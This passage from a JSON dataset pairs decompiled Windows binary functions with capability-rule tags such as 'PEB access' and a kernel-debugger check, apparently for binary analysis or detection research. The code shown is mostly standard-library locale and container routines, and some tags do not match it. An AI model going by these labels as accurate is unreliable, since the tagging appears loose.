iVar11);\n    }\n    return;\n}\n",
        "token_count": 6298
    },
    "180080e5": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nvoid fcn.180080e54(ulong arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    uint uVar4;\n    code **ppcVar5;\n    uint *puVar6;\n    code **ppcVar7;\n    code **ppcVar8;\n    code *pcVar9;\n    ulong uVar10;\n    int64_t iVar11;\n    uchar auStackX16 [8];\n    ulong var_38h;\n    code **appcStack120 [2];\n    ulong var_60h;\n    ulong var_58h;\n    ulong var_50h;\n    ulong var_30h;\n    \n    if ((arg2 & 2) != 0) {\n        if (arg4 == 0) {\n            if (*0x1801286c8 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801286c8 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801286c8 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801286c8;\n            ppcVar5 = fcn.18008fb2c(0x60);\n            if (ppcVar5 == NULL) {\n                ppcVar5 = NULL;\n            }\n            else {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = vtable.std::ctype_wchar_t_.0;\n                puVar6 = fcn.18007417c(appcStack120);\n                uVar4 = puVar6[1];\n                uVar1 = puVar6[2];\n                uVar2 = puVar6[3];\n                *(ppcVar5 + 2) = *puVar6;\n                *(ppcVar5 + 0x14) = uVar4;\n                *(ppcVar5 + 3) = uVar1;\n                *(ppcVar5 + 0x1c) = uVar2;\n                uVar4 = puVar6[5];\n                uVar1 = puVar6[6];\n                uVar2 = puVar6[7];\n                *(ppcVar5 + 4) = puVar6[4];\n                *(ppcVar5 + 0x24) = uVar4;\n                *(ppcVar5 + 5) = uVar1;\n                *(ppcVar5 + 0x2c) = uVar2;\n                puVar6 = fcn.180074580(&var_50h);\n                uVar4 = puVar6[1];\n                uVar1 = puVar6[2];\n                uVar2 = puVar6[3];\n                *(ppcVar5 + 6) = *puVar6;\n                *(ppcVar5 + 0x34) = uVar4;\n                *(ppcVar5 + 7) = uVar1;\n                *(ppcVar5 + 0x3c) = uVar2;\n                uVar4 = puVar6[5];\n                uVar1 = puVar6[6];\n                uVar2 = puVar6[7];\n                *(ppcVar5 + 8) = puVar6[4];\n                *(ppcVar5 + 0x44) = uVar4;\n                *(ppcVar5 + 9) = uVar1;\n                *(ppcVar5 + 0x4c) = uVar2;\n                ppcVar5[10] = *(puVar6 + 8);\n                *(ppcVar5 + 0xb) = puVar6[10];\n            }\n            fcn.180071848(arg3, ppcVar5, iVar11);\n        }\n        else {\n            if (*0x1801286c8 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801286c8 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801286c8 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801286c8;\n            uVar10 = fcn.180014560(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n        }\n    }\n    ppcVar5 = NULL;\n    if ((arg2 & 8) != 0) {\n        if (arg4 == 0) {\n            if (*0x1801288d8 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801288d8 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801288d8 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801288d8;\n            ppcVar7 = fcn.18008fb2c(0x10);\n            ppcVar8 = ppcVar5;\n            if (ppcVar7 != NULL) {\n                *(ppcVar7 + 1) = 0;\n                *ppcVar7 = \n                vtable.std::num_get_wchar_t__class_std::istreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0\n                ;\n                ppcVar8 = ppcVar7;\n            }\n            fcn.180071848(arg3, ppcVar8, iVar11);\n            if (*0x1801288e0 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801288e0 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801288e0 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801288e0;\n            ppcVar8 = fcn.18008fb2c(0x10);\n            if (ppcVar8 != NULL) {\n                *(ppcVar8 + 1) = 0;\n                *ppcVar8 = \n                vtable.std::num_put_wchar_t__class_std::ostreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0\n                ;\n                ppcVar5 = ppcVar8;\n            }\n            fcn.180071848(arg3, ppcVar5, iVar11);\n            if (*0x1801288e8 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801288e8 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801288e8 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801288e8;\n            ppcVar5 = fcn.18008fb2c(0x30);\n            if (ppcVar5 == NULL) {\n                ppcVar5 = NULL;\n            }\n            else {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = vtable.std::numpunct_wchar_t_.0;\n                fcn.18007f714(ppcVar5);\n            }\n        }\n        else {\n            if (*0x1801288d8 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801288d8 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801288d8 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801288d8;\n            uVar10 = fcn.1800777a0(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n            if (*0x1801288e0 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801288e0 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801288e0 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801288e0;\n            uVar10 = fcn.180077a08(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n            if (*0x1801288e8 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801288e8 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801288e8 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801288e8;\n            ppcVar5 = fcn.180077c70(arg4);\n        }\n        fcn.180071848(arg3, ppcVar5, iVar11);\n    }\n    uVar3 = fcn.180014980(0, 0);\n    if ((arg2 & (1 << (uVar3 & 0x1f)) >> 1) != 0) {\n        if (arg4 == 0) {\n            if (*0x18012b0c0 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x18012b0c0 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x18012b0c0 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x18012b0c0;\n            ppcVar5 = fcn.18008fb2c(0x20);\n            if (ppcVar5 == NULL) {\n                ppcVar5 = NULL;\n            }\n            else {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = vtable.std::collate_wchar_t_.0;\n                puVar6 = fcn.18007436c(appcStack120);\n                uVar4 = puVar6[1];\n                uVar1 = puVar6[2];\n                uVar2 = puVar6[3];\n                *(ppcVar5 + 2) = *puVar6;\n                *(ppcVar5 + 0x14) = uVar4;\n                *(ppcVar5 + 3) = uVar1;\n                *(ppcVar5 + 0x1c) = uVar2;\n            }\n            fcn.180071848(arg3, ppcVar5, iVar11);\n        }\n        else {\n            if (*0x18012b0c0 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x18012b0c0 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x18012b0c0 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x18012b0c0;\n            uVar10 = fcn.180014400(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n        }\n    }\n    ppcVar5 = NULL;\n    if ((arg2 & 0x20) != 0) {\n        if (arg4 == 0) {\n            if (*0x1801288f0 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801288f0 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801288f0 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801288f0;\n            ppcVar7 = fcn.18008fb2c(0x10);\n            ppcVar8 = ppcVar5;\n            if (ppcVar7 != NULL) {\n                *(ppcVar7 + 1) = 0;\n                *ppcVar7 = vtable.std::messages_wchar_t_.0;\n                ppcVar8 = ppcVar7;\n            }\n        }\n        else {\n            if (*0x1801288f0 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801288f0 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801288f0 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801288f0;\n            ppcVar8 = fcn.180076b98(arg4);\n        }\n        fcn.180071848(arg3, ppcVar8, iVar11);\n    }\n    if ((arg2 & 4) != 0) {\n        if (arg4 == 0) {\n            if (*0x1801288f8 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801288f8 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801288f8 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801288f8;\n            ppcVar7 = fcn.18008fb2c(0x10);\n            ppcVar8 = ppcVar5;\n            if (ppcVar7 != NULL) {\n                *(ppcVar7 + 1) = 0;\n                *ppcVar7 = \n                vtable.std::money_get_wchar_t__class_std::istreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0\n                ;\n                ppcVar8 = ppcVar7;\n            }\n            fcn.180071848(arg3, ppcVar8, iVar11);\n            if (*0x180128900 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128900 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128900 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128900;\n            ppcVar8 = fcn.18008fb2c(0x10);\n            if (ppcVar8 != NULL) {\n                *(ppcVar8 + 1) = 0;\n                *ppcVar8 = \n                vtable.std::money_put_wchar_t__class_std::ostreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0\n                ;\n                ppcVar5 = ppcVar8;\n            }\n            fcn.180071848(arg3, ppcVar5, iVar11);\n            if (*0x180128908 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128908 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128908 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128908;\n            ppcVar5 = fcn.18008fb2c(0x78);\n            if (ppcVar5 != NULL) {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = vtable.std::_Mpunct_wchar_t_.0;\n                *(ppcVar5 + 0x44) = 0;\n                fcn.18007f39c(ppcVar5);\n                *ppcVar5 = vtable.std::moneypunct_wchar_t__0_.0;\n            }\n            fcn.180071848(arg3, ppcVar5, iVar11);\n            if (*0x180128910 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128910 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128910 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128910;\n            ppcVar5 = fcn.18008fb2c(0x78);\n            if (ppcVar5 == NULL) {\n                ppcVar5 = NULL;\n            }\n            else {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = vtable.std::_Mpunct_wchar_t_.0;\n                *(ppcVar5 + 0x44) = 1;\n                fcn.18007f39c(ppcVar5);\n                *ppcVar5 = vtable.std::moneypunct_wchar_t__1_.0;\n            }\n        }\n        else {\n            if (*0x1801288f8 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801288f8 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801288f8 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801288f8;\n            uVar10 = fcn.180076e00(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n            if (*0x180128900 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128900 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128900 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128900;\n            uVar10 = fcn.180077068(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n            if (*0x180128908 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128908 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128908 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128908;\n            uVar10 = fcn.180077538(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n            if (*0x180128910 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128910 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128910 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128910;\n            ppcVar5 = fcn.180077404(arg4);\n        }\n        fcn.180071848(arg3, ppcVar5, iVar11);\n    }\n    if ((arg2 & 0x10) != 0) {\n        ppcVar5 = NULL;\n        if (arg4 == 0) {\n            if (*0x180128918 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128918 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128918 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128918;\n            ppcVar7 = fcn.18008fb2c(0x58);\n            ppcVar8 = ppcVar5;\n            if (ppcVar7 != NULL) {\n                *(ppcVar7 + 1) = 0;\n                *ppcVar7 = \n                vtable.std::time_get_wchar_t__class_std::istreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0\n                ;\n                ppcVar7[2] = NULL;\n                ppcVar7[3] = NULL;\n                ppcVar7[4] = NULL;\n                ppcVar8 = ppcVar7;\n                appcStack120[0] = ppcVar7;\n                fcn.180075cd4(ppcVar7, 0, arg1);\n                uVar4 = fcn.18008fa9c(ppcVar8);\n                *(ppcVar7 + 5) = uVar4;\n                ppcVar8 = ppcVar7;\n            }\n            fcn.180071848(arg3, ppcVar8, iVar11);\n            if (*0x1801288d0 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801288d0 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801288d0 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801288d0;\n            ppcVar8 = fcn.18008fb2c(0x18);\n            appcStack120[0] = ppcVar8;\n            if (ppcVar8 != NULL) {\n                *(ppcVar8 + 1) = 0;\n                *ppcVar8 = \n                vtable.std::time_put_wchar_t__class_std::ostreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0\n                ;\n                ppcVar8[2] = NULL;\n                pcVar9 = fcn.1800bfdf0();\n                ppcVar8[2] = pcVar9;\n                fcn.1800b2bb8(0);\n                ppcVar5 = ppcVar8;\n            }\n        }\n        else {\n            if (*0x180128918 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128918 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128918 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128918;\n            uVar10 = fcn.180077ed8(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n            if (*0x1801288d0 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801288d0 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801288d0 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801288d0;\n            ppcVar5 = fcn.180078140(arg4);\n        }\n        fcn.180071848(arg3, ppcVar5, iVar11);\n    }\n    ppcVar5 = NULL;\n    if ((arg2 & 2) != 0) {\n        if (arg4 == 0) {\n            if (*0x1801286f8 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801286f8 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801286f8 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801286f8;\n            ppcVar8 = fcn.18008fb2c(0x40);\n            appcStack120[0] = ppcVar8;\n            if (ppcVar8 != NULL) {\n                *(ppcVar8 + 1) = 0;\n                *ppcVar8 = vtable.std::codecvt_wchar_t__char__struct__Mbstatet_.0;\n                puVar6 = fcn.180074580(&var_50h);\n                uVar4 = puVar6[1];\n                uVar1 = puVar6[2];\n                uVar2 = puVar6[3];\n                *(ppcVar8 + 2) = *puVar6;\n                *(ppcVar8 + 0x14) = uVar4;\n                *(ppcVar8 + 3) = uVar1;\n                *(ppcVar8 + 0x1c) = uVar2;\n                uVar4 = puVar6[5];\n                uVar1 = puVar6[6];\n                uVar2 = puVar6[7];\n                *(ppcVar8 + 4) = puVar6[4];\n                *(ppcVar8 + 0x24) = uVar4;\n                *(ppcVar8 + 5) = uVar1;\n                *(ppcVar8 + 0x2c) = uVar2;\n                ppcVar8[6] = *(puVar6 + 8);\n                *(ppcVar8 + 7) = puVar6[10];\n                ppcVar5 = ppcVar8;\n            }\n        }\n        else {\n            if (*0x1801286f8 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801286f8 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801286f8 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801286f8;\n            ppcVar5 = fcn.180012710(arg4);\n        }\n        fcn.180071848(arg3, ppcVar5, iVar11);\n    }\n    return;\n}\n",
        "token_count": 6413
    },
    "180040ce": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66"
        ],
        "decompiled_code": "\nvoid fcn.180040ce0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    ulong arg2;\n    uchar *arg2_00;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    int64_t iVar7;\n    uchar auStack152 [32];\n    uchar auStack120 [16];\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    ushort uStack88;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar uStack56;\n    ulong uStack48;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint64_t uStack24;\n    \n    uStack48 = 0x180040d08;\n    (**0x1800de7f0)(*(arg1 + 0x58), 0x184, 0, 0);\n    iVar7 = *(arg1 + 200);\n    iVar5 = *(arg1 + 0xc0);\n    uVar3 = 0;\n    iVar1 = iVar7 - iVar5 >> 0x3f;\n    uVar4 = uVar3;\n    if ((iVar7 - iVar5) / 0x60 + iVar1 != iVar1) {\n        do {\n            puVar6 = iVar5 + 0x20 + uVar4;\n            if (7 < puVar6[3]) {\n                puVar6 = *puVar6;\n            }\n            uStack48 = 0x180040d73;\n            (**0x1800de7f0)(*(arg1 + 0x58), 0x180, 0, puVar6);\n            iVar7 = *(arg1 + 200);\n            iVar5 = *(arg1 + 0xc0);\n            uVar3 = uVar3 + 1;\n            uVar4 = uVar4 + 0x60;\n        } while (uVar3 < (iVar7 - iVar5) / 0x60);\n    }\n    iVar1 = iVar7 - iVar5 >> 0x3f;\n    if ((iVar7 - iVar5) / 0x60 + iVar1 != iVar1) {\n        uStack48 = 0x180040de4;\n        (**0x1800de7f0)(*(arg1 + 0x58), 0x186, 0, 0);\n    }\n    *(arg1 + 0x51) = 0x101;\n    uStack24 = *0x180123080 ^ &stack0xffffffffffffff68;\n    arg2 = 0x188;\n    iVar2 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if (iVar2 == -1) {\n        arg2_00 = &stack0xffffffffffffff88;\n        uStack104 = *0x180101910;\n        uStack100 = *0x180101914;\n        uStack96 = *0x180101918;\n        uStack92 = *0x18010191c;\n        auStack120[0] = 0;\n        uStack40 = 0;\n        uStack36 = 0;\n        uStack32 = 0;\n        uStack28 = 0;\n        uStack72 = *0x180101900;\n        uStack68 = *0x180101904;\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88 = 0;\n        uStack56 = 0;\n        uStack48 = 0;\n        fcn.180048db0(&stack0xffffffffffffffd0, arg2);\n        fcn.180042e30(&stack0xffffffffffffff88);\n    }\n    else {\n        arg2_00 = iVar2 * 0x60 + *(arg1 + 0xc0);\n    }\n    fcn.180042f10(arg1, arg2_00);\n    fcn.180042fb0(arg1);\n    fcn.180043cf0(arg1);\n    fcn.18008fb00(uStack24 ^ &stack0xffffffffffffff68);\n    return;\n}\n",
        "token_count": 955
    },
    "180048d6": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66"
        ],
        "decompiled_code": "\nvoid fcn.180048d60(ulong noname_0, int64_t arg2, int64_t arg3)\n\n{\n    int64_t arg1;\n    \n    arg1 = arg2;\n    if (arg2 != arg3) {\n        do {\n            fcn.180048db0(arg1 + 0x48, arg2);\n            fcn.180042e30(arg1);\n            arg1 = arg1 + 0x60;\n        } while (arg1 != arg3);\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "180048e7": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66"
        ],
        "decompiled_code": "\nvoid fcn.180048e70(ulong noname_0, int64_t arg2, int64_t arg3)\n\n{\n    if (arg2 != arg3) {\n        do {\n            fcn.180048ec0(arg2 + 0x48);\n            fcn.180042e30(arg2);\n            arg2 = arg2 + 0x60;\n        } while (arg2 != arg3);\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "1800493c": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800493c0(ulong arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    uchar auStack88 [32];\n    ulong uStack56;\n    uchar auStack48 [16];\n    ulong uStack32;\n    uint64_t uStack24;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack88;\n    auStack48 = CONCAT88(arg4, arg4);\n    uStack32 = arg1;\n    if (arg2 != arg3) {\n        do {\n            fcn.180043fe0(arg4, arg2);\n            arg4 = arg4 + 0x60;\n            auStack48 = CONCAT88(arg4, auStack48._0_8_);\n            arg2 = arg2 + 0x60;\n        } while (arg2 != arg3);\n    }\n    fcn.18008fb00(uStack24 ^ auStack88);\n    return;\n}\n",
        "token_count": 230
    },
    "18004974": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66"
        ],
        "decompiled_code": "\nuchar * fcn.180049740(ulong noname_0, uchar *arg2, int64_t arg3)\n\n{\n    ulong *puVar1;\n    \n    if (arg3 != 0) {\n        puVar1 = arg2 + 0x38;\n        do {\n            *(arg2 + 1) = ZEXT816(0);\n            *(arg2 + 0x11) = ZEXT816(0);\n            *(arg2 + 0x21) = ZEXT816(0);\n            *(arg2 + 0x31) = ZEXT816(0);\n            *(arg2 + 0x41) = ZEXT816(0);\n            *(arg2 + 0x51) = 0;\n            *(arg2 + 0x59) = 0;\n            *(arg2 + 0x5d) = 0;\n            arg2[0x5f] = 0;\n            *arg2 = 0;\n            arg2 = arg2 + 0x60;\n            puVar1[-5] = 0;\n            puVar1[-4] = 0xf;\n            puVar1[-1] = 0;\n            *puVar1 = 7;\n            *(puVar1 + -3) = 0;\n            *(puVar1 + 1) = 0;\n            puVar1[2] = 0;\n            puVar1[3] = 0;\n            puVar1[4] = 0;\n            arg3 = arg3 + -1;\n            puVar1 = puVar1 + 0xc;\n        } while (arg3 != 0);\n    }\n    return arg2;\n}\n",
        "token_count": 364
    },
    "18004a0e": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66"
        ],
        "decompiled_code": "\nuint * fcn.18004a0e0(ulong *arg1, ulong *arg2, uint *arg3)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    ulong *puVar7;\n    uint *puVar8;\n    \n    puVar8 = arg3;\n    if (arg1 != arg2) {\n        puVar7 = arg1 + 10;\n        do {\n            *(arg3 + (-0x40 - arg1) + puVar7) = 0;\n            *(arg3 + (-0x38 - arg1) + puVar7) = 0;\n            uVar4 = *(puVar7 + -0x4c);\n            uVar5 = *(puVar7 + -9);\n            uVar6 = *(puVar7 + -0x44);\n            puVar1 = puVar7 + 0xc;\n            *puVar8 = *(puVar7 + -10);\n            puVar8[1] = uVar4;\n            puVar8[2] = uVar5;\n            puVar8[3] = uVar6;\n            uVar4 = *(puVar7 + -0x3c);\n            uVar5 = *(puVar7 + -7);\n            uVar6 = *(puVar7 + -0x34);\n            puVar8[4] = *(puVar7 + -8);\n            puVar8[5] = uVar4;\n            puVar8[6] = uVar5;\n            puVar8[7] = uVar6;\n            puVar7[-8] = 0;\n            puVar8 = puVar8 + 0x18;\n            puVar7[-7] = 0xf;\n            *(puVar7 + -10) = 0;\n            *(arg3 + (-0x80 - arg1) + puVar1) = 0;\n            *(arg3 + (-0x78 - arg1) + puVar1) = 0;\n            uVar4 = *(puVar7 + -0x2c);\n            uVar5 = *(puVar7 + -5);\n            uVar6 = *(puVar7 + -0x24);\n            puVar3 = arg3 + (-0x90 - arg1) + puVar1;\n            *puVar3 = *(puVar7 + -6);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            uVar4 = *(puVar7 + -0x1c);\n            uVar5 = *(puVar7 + -3);\n            uVar6 = *(puVar7 + -0x14);\n            puVar3 = arg3 + (-0x80 - arg1) + puVar1;\n            *puVar3 = *(puVar7 + -4);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            puVar7[-4] = 0;\n            puVar7[-3] = 7;\n            *(puVar7 + -6) = 0;\n            *(arg3 + (-0x70 - arg1) + puVar1) = *(puVar7 + -2);\n            *(arg3 + (-0x68 - arg1) + puVar1) = 0;\n            *(arg3 + (-0x60 - arg1) + puVar1) = 0;\n            *(arg3 + (-0x58 - arg1) + puVar1) = 0;\n            *(arg3 + (-0x68 - arg1) + puVar1) = puVar7[-1];\n            *(arg3 + (-0x60 - arg1) + puVar1) = *puVar7;\n            *(arg3 + (-0x58 - arg1) + puVar1) = puVar7[1];\n            puVar2 = puVar7 + 2;\n            puVar7[-1] = 0;\n            *puVar7 = 0;\n            puVar7[1] = 0;\n            puVar7 = puVar1;\n        } while (puVar2 != arg2);\n    }\n    return puVar8;\n}\n",
        "token_count": 960
    },
    "18004a1d": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66"
        ],
        "decompiled_code": "\nuint * fcn.18004a1d0(ulong *arg1, ulong *arg2, uint *arg3)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    ulong *puVar7;\n    uint *puVar8;\n    \n    puVar8 = arg3;\n    if (arg1 != arg2) {\n        puVar7 = arg1 + 10;\n        do {\n            *(arg3 + (-0x40 - arg1) + puVar7) = 0;\n            *(arg3 + (-0x38 - arg1) + puVar7) = 0;\n            uVar4 = *(puVar7 + -0x4c);\n            uVar5 = *(puVar7 + -9);\n            uVar6 = *(puVar7 + -0x44);\n            puVar1 = puVar7 + 0xc;\n            *puVar8 = *(puVar7 + -10);\n            puVar8[1] = uVar4;\n            puVar8[2] = uVar5;\n            puVar8[3] = uVar6;\n            uVar4 = *(puVar7 + -0x3c);\n            uVar5 = *(puVar7 + -7);\n            uVar6 = *(puVar7 + -0x34);\n            puVar8[4] = *(puVar7 + -8);\n            puVar8[5] = uVar4;\n            puVar8[6] = uVar5;\n            puVar8[7] = uVar6;\n            puVar7[-8] = 0;\n            puVar8 = puVar8 + 0x18;\n            puVar7[-7] = 0xf;\n            *(puVar7 + -10) = 0;\n            *(arg3 + (-0x80 - arg1) + puVar1) = 0;\n            *(arg3 + (-0x78 - arg1) + puVar1) = 0;\n            uVar4 = *(puVar7 + -0x2c);\n            uVar5 = *(puVar7 + -5);\n            uVar6 = *(puVar7 + -0x24);\n            puVar3 = arg3 + (-0x90 - arg1) + puVar1;\n            *puVar3 = *(puVar7 + -6);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            uVar4 = *(puVar7 + -0x1c);\n            uVar5 = *(puVar7 + -3);\n            uVar6 = *(puVar7 + -0x14);\n            puVar3 = arg3 + (-0x80 - arg1) + puVar1;\n            *puVar3 = *(puVar7 + -4);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            puVar7[-4] = 0;\n            puVar7[-3] = 7;\n            *(puVar7 + -6) = 0;\n            *(arg3 + (-0x70 - arg1) + puVar1) = *(puVar7 + -2);\n            *(puVar7 + arg3 + (-0xc - arg1)) = *(puVar7 + -0xc);\n            *(puVar7 + arg3 + (-8 - arg1)) = 0;\n            *(arg3 + (-0x60 - arg1) + puVar1) = 0;\n            *(arg3 + (-0x58 - arg1) + puVar1) = 0;\n            *(puVar7 + arg3 + (-8 - arg1)) = puVar7[-1];\n            *(arg3 + (-0x60 - arg1) + 